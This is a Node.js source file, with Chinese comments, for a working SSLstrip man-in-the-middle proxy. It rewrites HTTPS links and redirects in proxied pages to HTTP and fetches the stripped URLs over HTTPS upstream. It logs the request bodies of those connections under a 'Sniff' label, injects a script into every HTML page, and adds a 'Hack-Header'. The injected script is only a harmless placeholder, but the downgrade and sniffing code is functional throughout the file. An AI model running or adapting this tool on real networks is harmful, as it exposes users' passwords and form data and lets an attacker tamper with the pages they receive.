const http = require('http');
const https = require('https');
const net = require('net');
const url = require('url');
const zlib = require('zlib');

class ProxyServer {
  start(port) {
    // 存储本应是 https 的链接 url
    this._urlMap = {};

    const server = http.createServer();

    // handle http
    server.on('request', this.onRequest.bind(this));
    // handle https
    server.on('connect', this.onConnect);

    // handle errors
    server.on('clientError', (err, socket) => {
      console.log('clientError:', err);
    });
    server.on('error', err => {
      console.log('serverError:', err);
    });

    // listen
    server.listen(port, () => {
      console.log('SSLstrip Server Listen Port:', port);
    });
  }

  onRequest(request, response) {
    let useSSL = this.shouldBeHttps(request);
    let options = this.getRequestOptions(request, useSSL);
    let client = useSSL ? https : http;
    let handleResponse = (err, remoteResponse) => {
      if (err) {
        console.log(
          'RequestError:',
          options.host + ':' + options.port + options.path
        );
        response.writeHead(502, 'Proxy fetch failed');
      } else {
        // strip location header
        let locationHeader = remoteResponse.headers.location;
        if (locationHeader && locationHeader.includes('https')) {
          remoteResponse.headers.location = locationHeader.replace(
            'https:',
            'http:'
          );
          this.updateUrlMap(remoteResponse.headers.location);
          // 重定向的地址是当前请求地址对应的https地址，这种直接反向代理
          // 不然在客户端会不停重定向（虽然现代浏览器有限制无限重定向，但体验不好，会显示“无法打开网页”几秒钟）
          console.log(remoteResponse.headers.location, request.url);
          if (remoteResponse.headers.location === request.url) {
            useSSL = this.shouldBeHttps(request);
            options = this.getRequestOptions(request, useSSL);
            client = useSSL ? https : http;
            console.log('Reverse Proxy:', request.url);
            let remoteRequest = this.proxyRequest(
              client,
              options,
              handleResponse
            );
            request.pipe(remoteRequest);
            return;
          }
        }

        let contentType = remoteResponse.headers['content-type'];
        if (contentType && contentType.includes('html')) {
          // 对于 html 响应中的数据做处理
          this.stripSSL(remoteResponse, response);
        } else {
          remoteResponse.pipe(response);
          response.writeHead(remoteResponse.statusCode, remoteResponse.headers);
          //response.pipe(remoteResponse);
        }
      }
    };
    let remoteRequest = this.proxyRequest(client, options, handleResponse);
    request.pipe(remoteRequest);
    if (useSSL) {
      request.on('data', chunk => {
        console.log('Sniff:', chunk.toString());
      });
    }
  }

  // TODO 处理301重定向的问题，由于要做HTTPS降级到HTTP，而一般网站会做HTTP重定向到HTTPS
  // 这里在客户端会死循环。

  proxyRequest(client, options, callback) {
    let remoteRequest = client.request(options, remoteResponse => {
      callback(null, remoteResponse);
    });
    remoteRequest.on('error', err => {
      callback(err);
    });
    return remoteRequest;
  }

  /**
   * 判断是否本来应该是 https 的请求
   */
  shouldBeHttps(request) {
    let requestUrl = request.headers.host + url.parse(request.url).pathname;
    return this._urlMap[requestUrl];
  }

  /**
   * 记录本应是 https 请求的 url
   */
  updateUrlMap(httpsLink) {
    // 处理 Url ，只保留 hostname 和 pathname
    let parseObj = url.parse(httpsLink);
    let handledUrl = parseObj.hostname + parseObj.pathname;
    //console.log('Add Url:', handledUrl);
    this._urlMap[handledUrl] = true;
  }

  /**
   * 获取发出请求的参数
   */
  getRequestOptions(request, useSSL) {
    let hostInfo = request.headers.host.split(':');
    let path = request.headers.path || url.parse(request.url).path;
    let defaultPort = useSSL ? 443 : 80;
    let protocol = useSSL ? 'https:' : 'http:';
    if (request.method === 'POST') {
      request.headers['X-Requested-With'] = 'XMLHttpRequest';
      request.headers['accept'] = 'application/json';
    }
    return {
      host: hostInfo[0],
      port: hostInfo[1] || defaultPort,
      protocol,
      path,
      method: request.method,
      headers: request.headers,
    };
  }

  /*
	*  修改响应的html，植入自定义代码
	*/
  modifyHtml(html) {
    const urlRegex = /"(https:\/\/[\w\d:#@%\/;$()~_?\+-=\\\.&]*)"/g;
    return html
      .replace(urlRegex, (match, $1) => {
        this.updateUrlMap($1);
        return match.replace('https', 'http');
      })
      .replace(
        '</head>',
        `<script>
		console.log('假装是一串恶意代码！')
		console.log('%c       ', 'height:50px;line-height:50px; background: url(http://qq.yh31.com/tp/zjbq/201612131319091652.gif) no-repeat;background-size:cover');
		</script></head>`
      );
  }

  modifyHeaders(res) {
    res.headers['Hack-Header'] = 'xxxxx';
  }

  /**
   * 修改从服务器返回的响应内容
   * 并返回给客户端
   */
  stripSSL(remoteResponse, response) {
    let inputStream;
    let body = '';
    delete remoteResponse.headers['content-length'];
    this.modifyHeaders(remoteResponse);
    response.writeHead(remoteResponse.statusCode, remoteResponse.headers);
    // 如果是压缩了的，需要先解压缩再更改内容
    if (remoteResponse.headers['content-encoding'] === 'gzip') {
      inputStream = zlib.createGunzip();
      remoteResponse.pipe(inputStream);
      inputStream.on('data', chunk => {
        body += chunk.toString('utf-8');
      });
      inputStream.on('end', () => {
        let buf = new Buffer(this.modifyHtml(body), 'utf-8');
        // 处理完成后需要重新压缩，除非把响应头的content-encoding也修改掉
        zlib.gzip(buf, (err, result) => {
          response.end(result);
        });
      });
    } else {
      remoteResponse.on('data', chunk => {
        body += chunk.toString('utf-8');
      });
      remoteResponse.on('end', () => {
        let html = this.modifyHtml(body);
        response.end(html);
      });
    }
  }

  /**
   * handle https
   */
  onConnect(request, socket, head) {
    let options = {
      host: request.url.split(':')[0],
      port: request.url.split(':')[1] || 443,
    };

    socket.on('error', err => {
      console.log('Https socket error');
    });

    let tunnel = net.createConnection(options, () => {
      let content =
        'HTTP/1.1 200 Connection established\r\nConnection: keep-alive\r\n\r\n';
      socket.write(content, 'UTF-8', () => {
        tunnel.pipe(socket);
        socket.pipe(tunnel);
      });
    });

    tunnel.on('error', err => {
      console.log('Https connect to server error');
    });
  }
}

let proxy = new ProxyServer();
proxy.start(8081);
